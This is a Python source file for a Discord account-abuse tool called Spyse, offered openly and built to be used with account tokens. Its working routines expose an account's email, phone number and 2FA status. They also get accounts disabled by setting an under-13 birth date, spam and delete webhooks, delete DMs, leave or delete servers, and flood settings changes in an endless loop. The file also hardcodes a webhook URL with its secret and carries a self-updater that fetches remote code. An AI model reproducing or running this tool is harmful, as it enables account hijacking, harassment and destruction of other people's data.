#version test 3
import sys
import requests
import colorama
from colorama import *
import random
import time 
import rich
from rich import * 
import os 
from os import system
console = get_console()

maj = 'V4'
webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
#please don't spam or nuke this one it's really important for the tool

def version():
    r = requests.get("https://raw.githubusercontent.com/heygdrg/Spyse/main/version.txt")
    mode = r.text
    with open('version.txt') as file:
        txt = file.read()
    if mode == txt:
        time.sleep(1)
    else:
        os.system("Title - SPYSE New Update Found!")
        update_banner = '''
                [red]███[/red]╗   [red]██[/red]╗[red]███████[/red]╗[red]██[/red]╗    [red]██[/red]╗    [red]██[/red]╗   [red]██[/red]╗[red]██████[/red]╗ [red]██████[/red]╗  [red]█████[/red]╗ [red]████████[/red]╗[red]███████[/red]╗[red]██[/red]╗
                [red]████[/red]╗  [red]██[/red]║[red]██[/red]╔════╝[red]██[/red]║    [red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██[/red]╔══[red]██[/red]╗[red]██[/red]╔══[red]██[/red]╗[red]██[/red]╔══[red]██[/red]╗╚══[red]██[/red]╔══╝[red]██[/red]╔════╝[red]██║
                [red]██[/red]╔[red]██[/red]╗ [red]██[/red]║[red]█████[/red]╗  [red]██[/red]║ [red]█[/red]╗ [red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██████[/red]╔╝[red]██[/red]║  [red]██[/red]║[red]███████[/red]║   [red]██[/red]║   [red]█████[/red]╗  [red]██[/red]║
                [red]██[/red]║╚[red]██[/red]╗[red]██[/red]║[red]██[/red]╔══╝  [red]██[/red]║[red]███[/red]╗[red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██[/red]╔═══╝ [red]██[/red]║  [red]██[/red]║[red]██[/red]╔══[red]██[/red]║   [red]██[/red]║   [red]██[/red]╔══╝  ╚═╝
                [red]██[/red]║ ╚[red]████[/red]║[red]███████[/red]╗╚[red]███[/red]╔[red]███[/red]╔╝    ╚[red]██████[/red]╔╝[red]██[/red]║     [red]██████[/red]╔╝[red]██[/red]║  [red]██[/red]║   [red]██[/red]║   [red]███████[/red]╗[red]██[/red]╗
                # [red]╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝[/red]
                    [red]Looks like this SPYSE {maj} is outdated [/red]'''
        console.print(update_banner)
        fin = str(input(
            f'[yellow][>>>][/yellow]You want to update to the latest version? (y/n):'))
        if fin == "n":
            pass
        else:
            d = requests.get('https://raw.githubusercontent.com/heygdrg/Spyse/main/common.py')
            update = d.text
            with open('common.py', "w", encoding="utf-8") as file:
                file.write(update)
            e = requests.get('https://raw.githubusercontent.com/heygdrg/Spyse/main/version.txt')
            up = e.text
            with open('common.py', "w", encoding="utf-8") as file:
                file.write(up)
    os.system('cls||clear')


def validate_webhook(webhook):
    stat = requests.get(webhook).json()
    try:
        try:
            name = stat['name']
            name = 2
        except:
            name = 1
        if name == 2:
            console.print('[green][[/green][purple]?[/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
            main()
    except:
        console.print('[green][[/green][purple]?[/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
        main()

def validateToken(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    if r.status_code == 200:
        pass
    else:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def getheaders(token):

    headers =     {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    }

    if token:
        headers.update({"Authorization": token})
        return headers

def setting():
    setting_banner = """
    [purple]╔════════════╗[/purple]
    [green]{[/green][purple]1[/purple][green]}[/green] Proxies 
    [green]{[/green][purple]2[/purple][green]}[/green] Licence
    [green]{[/green][purple]3[/purple][green]}[/green] Exit 
    [purple]╚════════════╝[/purple]
    """
    print(setting_banner)
    choice = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Your choice :[/purple] ")
    if choice == "3":
        main()
    if choice == "1":
        console.print("[green]setting proxies successfully[/green]")
        main()
    if choice == "2":
        print()
        console.print("[green]Discord : [/green][purple]BKS#1958[/purple]")
        console.print("[green]shop : [/green][purple]https://discord.gg/Dvu6s4TBFP[/purple]")
        console.print('[green]github = [/green][purple]https://github.com/heygdrg[/purple]')
        print()
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        
        main()

def report():
    message = console.input("[green][[/green][purple]?[/purple][green]][/green] [purple]tell us what wrong [please join your discord #][/purple] : ")
    r = requests.post(webhook,json={'username': 'SPYSE report bot', 'content': message})
    console.print("[green][[/green][purple]![/purple][green]][/green] [purple]report succesfully sent thank you for your support[/purple]")
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def token_info():
    os.system(f'Title - Spyse - Token info')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    r = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()
    username = r['username']
    hastag = r["discriminator"]
    id = r['id']
    bio = r['bio']
    language = r['locale']
    phone = r['phone']
    email = r['email']
    mfa = r['mfa_enabled']
    userid = username + hastag


    console.print(f'''
[purple]<<────────────[/purple][green]{username}[/green][purple]────────────>>[/purple]
[green][[/green][purple]User ID[/purple][green]][/green]         {userid}
[green][[/green][purple]bio[/purple][green]][/green]             {bio}
[green][[/green][purple]Language[/purple][green]][/green]        {language}
[green][[/green][purple]Token[/purple][green]][/green]           {token}
[purple]<───────────[/purple][green]Security Info[/green][purple]───────────>[/purple]
[green][[/green][purple]2 Factor[/purple][green]][/green]        {mfa}
[green][[/green][purple]Email[/purple][green]][/green]           {email}
[green][[/green][purple]Phone number[/purple][green]][/green]    {phone if phone else ""}
                    ''')

    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()



def BioChanger():
    os.system(f'Title - Spyse - Bio changer')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    bio = console.input("[green][[/green][purple]?[/purple][green]][/green] enter the [purple]new bio[/purple] : ")
    custom_bio = {"bio": str(bio)}
    try:
        requests.patch("https://discord.com/api/v9/users/@me", headers=getheaders(token), json=custom_bio)
        console.print(f"[green][[/green][purple]![/purple][green]][/green]\n{Fore.GREEN}Bio changed to {Fore.WHITE}{bio}{Fore.GREEN} ")
        console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
    except Exception as e:
        console.print(f"[green][[/green][purple]![/purple][green]][/green] {Fore.RED}Error:\n{e}\nOccurred while trying to change the status :/")
    console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
    main()



def StartSeizure():
    os.system(f'Title - Spyse - Seizure')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    console.print("[green][[/green][purple]![/purple][green]][/green]\"ctrl + c\" at anytime to [purple]stop[/purple]\n")
    while True:
            setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
            console.print("[green][[/green][purple]![/purple][green]][/green] [purple]processing[/purple]")



def tokendisable():
    os.system(f'Title - Spyse - token nuker')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    res = requests.patch('https://discordapp.com/api/v9/users/@me', headers=getheaders(token), json={'date_of_birth': '2014-2-11'})

    if res.status_code == 400:
        res_message = res.json().get('date_of_birth', ['no response message'])[0]

        if res_message == "You need to be 13 or older in order to use Discord.":
            console.print(f'[green][[/green][purple]![/purple][green]][/green] \n{Fore.RED}Token successfully disabled!{Fore.RESET}\n')
        elif res_message == "You cannot update your date of birth.":
            console.print('[green][[/green][purple]![/purple][green]][/green] Account can\'t be [purple]disabled[/purple]')
        else:
            console.print(f'[green][[/green][purple]![/purple][green]][/green] Unknown [purple]response[/purple] : {res_message}')
    else:
        console.print('[green][[/green][purple]![/purple][green]][/green] Failed to disable [purple]account[/purple]')
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()


def Leaver():
    os.system(f'Title - Spyse - server leaver')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    guilds = console.input("[green][[/green][purple]?[/purple][green]][/green] enter the [purple]guilds id[/purple] : ")
    for guild in guilds:
        response = requests.delete('https://discord.com/api/v8/users/@me/guilds/' + guild['id'], headers={'Authorization': token})
        if response.status_code == 204 or response.status_code == 200:
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        elif response.status_code == 400:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers=getheaders(token))
            print(f'[green][[/green][purple]![/purple][green]][/green] Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        else:
            console.print(f"[green][[/green][purple]?[/purple][green]][/green] The following error has been [purple]encountered and is being ignored[/purple]: {response.status_code}")
            pass
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()



def Webhook_Spammer():
    try:
        os.system(f'Title - Spyse - Webhook spamer')
        webhook = console.input('[green][[/green][purple]?[/purple][green]][/green] enter [purple]webhook[/purple] : ')
        validate_webhook(webhook)
        Message = console.input("[green][[/green][purple]?[/purple][green]][/green] what you want to [purple]say[/purple] : ")
        print("\"ctrl + c\" at anytime to stop\n")
        time.sleep(1.5)
        for i in range(30):
            response = requests.post(
                webhook, json = {"content" : Message}, params = {'wait' : True})
        console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed Webhook Successfully! ')
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    except:
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        pass




def webhook_deleter():
    try:
        os.system(f'Title - Spyse - Webhook deleter')
        webhook = console.input(f'[green][[/green][purple]?[/purple][green]][/green]Enter [purple]webhook URL[/purple]: ')
        validate_webhook(webhook)
        stat = requests.get(webhook).json()
        name = stat['name']
        r = requests.delete(webhook)
        print(f'[green][[/green][purple]![/purple][green]][/green] Delete webhook [purple]name {name}[/purple]! ')
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    except:
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        pass

def DmDeleter():

    os.system('Title - Spyse - Dm deleter')
    token = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]token[/purple] : ")
    validateToken(token)
    channel = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]channel id to delete[/purple] : ")
    requests.delete(f'https://discord.com/api/v9/channels/{channel}?silent=false', headers=getheaders(token))
    print(f"[green][[/green][purple]![/purple][green]]Deleted DM: [purple]{channel}[/purple]")
    console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()



def main():
    version()
    os.system(f'Title - Spyse - {maj}')
    os.system('cls||clear')

    banner = """

            

                                    [green]███████[/green][purple]╗[green]██████[/green][purple]╗ [green]██[/green][purple]╗   [green]██[/green][purple]╗[green]███████[/green][purple]╗[green]███████[/green][purple]╗    
                                    [green]██[/green][purple]╔════╝[green]██[/green][purple]╔══[green]██[/green][purple]╗╚[green]██[/green][purple]╗ [green]██[/green][purple]╔╝[green]██[/green][purple]╔════╝[green]██[/green][purple]╔════╝    
                                    [green]███████[/green][purple]╗[green]██████[/green][purple]╔╝ ╚[green]████[/green][purple]╔╝ [green]███████[/green][purple]╗[green]█████[/green][purple]╗      
                                    [purple]╚════[green]██[/green]║[green]██[/green]╔═══╝   ╚[green]██[/green]╔╝  ╚════[green]██[/green]║[green]██[/green]╔══╝      
                                    [green]███████[/green]║[green]██[/green]║        [green]██[/green]║   [green]███████[/green]║[green]███████[/green]╗    
                                    ╚══════╝╚═╝        ╚═╝   ╚══════╝╚══════╝    
                            ╔═══════════════════════════════════════════════════╗                                             
                            ║  [green]{[/green][purple]1[/purple][green]}[/green] Dm deleter              [green]{[/green][purple]6[/purple][green]}[/green] Server leaver    ║
                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]7[/purple][green]}[/green] Seizure          ║
                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]8[/purple][green]}[/green] Token info       ║
                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]9[/purple][green]}[/green] Setting          ║
                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]10[/purple][green]}[/green] Make a report   ║                                                                                                                                                 
                            ╚═══════════════════════════════════════════════════╝
                 

    """

    console.print(banner)

    choice = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Your choice :[/purple] ")
    if choice == "1":
        DmDeleter()
    if choice == "2": 
        webhook_deleter()
    if choice == "3":
        Webhook_Spammer()
    if choice == "4":
        BioChanger()
    if choice == "5":
        tokendisable()
    if choice == "6":
        Leaver()
    if choice == "7":
        StartSeizure()
    if choice == "8":
        token_info()
    if choice == "9":
        setting()
    if choice == "10":
        report()
    else:
        os.system('cls||clear')
        main()

if sys.argv[1] == 'cle123': main()


